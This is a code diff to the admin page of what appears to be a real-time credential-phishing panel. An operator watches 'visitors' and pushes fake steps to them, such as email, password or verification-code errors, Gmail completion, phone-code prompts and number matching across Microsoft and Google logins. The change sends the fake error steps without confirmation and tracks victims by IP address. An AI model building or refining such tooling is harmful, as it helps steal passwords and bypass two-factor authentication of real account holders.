@@ -332,7 +332,11 @@ function VisitorModal({
       setPhoneCodeDialogOpen(true);
       return;
     }
-    if (step === 'gmail-done') { onPushAction(visitor.id, step, extra); return; }
+    // Error and immediate steps — send without preview confirmation
+    if (step === 'gmail-done' || step === 'error-email' || step === 'error-password' || step === 'error-code') {
+      onPushAction(visitor.id, step, extra);
+      return;
+    }
     setPendingAction({ step, label, color, extra });
   };
 
@@ -681,7 +685,7 @@ export default function AdminPage() {
   const [gVerifyMethod, setGVerifyMethod] = useState<'sms' | 'auth'>('sms');
   const [gCorrectNumber, setGCorrectNumber] = useState(45);
   const [visitors, setVisitors] = useState<VisitorInfo[]>([]);
-  const [modalVisitorId, setModalVisitorId] = useState<string | null>(null);
+  const [modalVisitorIp, setModalVisitorIp] = useState<string | null>(null);
   const [previewKey, setPreviewKey] = useState(0);
   const [sidebarOpen, setSidebarOpen] = useState(false);
   const [windowWidth, setWindowWidth] = useState(typeof window !== 'undefined' ? window.innerWidth : 1200);
@@ -767,7 +771,7 @@ export default function AdminPage() {
             }));
           } else if (msg.type === 'visitor-deleted' && msg.id) {
             setVisitors(prev => prev.filter(v => v.id !== msg.id));
-            setModalVisitorId(prev => prev === msg.id ? null : prev);
+            setModalVisitorIp(prev => { const v = visitors.find(x => x.id === msg.id); return prev === (v?.ip ?? msg.id) ? null : prev; });
           }
         } catch { /* ignore */ }
       };
@@ -817,7 +821,7 @@ export default function AdminPage() {
     }
   };
 
-  const modalVisitor = visitors.find(v => v.id === modalVisitorId) ?? null;
+  const modalVisitor = visitors.find(v => v.ip === modalVisitorIp) ?? null;
 
   const providers: { id: Provider; name: string; icon: React.ReactNode }[] = [
     { id: 'microsoft', name: 'Microsoft', icon: <MicrosoftLogoLg /> },
@@ -885,7 +889,7 @@ export default function AdminPage() {
       {modalVisitor && (
         <VisitorModal
           visitor={modalVisitor}
-          onClose={() => setModalVisitorId(null)}
+          onClose={() => setModalVisitorIp(null)}
           onPushAction={pushAction}
           onDeleteField={deleteField}
           onDeleteAll={deleteAll}
@@ -1122,7 +1126,7 @@ export default function AdminPage() {
                       {/* Action row */}
                       <div className="px-3 pb-3 flex items-center gap-1.5">
                         <button
-                          onClick={() => setModalVisitorId(v.id)}
+                          onClick={() => setModalVisitorIp(v.ip)}
                           className="flex-1 flex items-center justify-center gap-1.5 py-1.5 rounded-lg bg-[#2d3139] hover:bg-[#3a3f4a] text-[#aeb5c0] hover:text-white transition-colors text-[11px] font-medium"
                           title="Open live view"
                         >
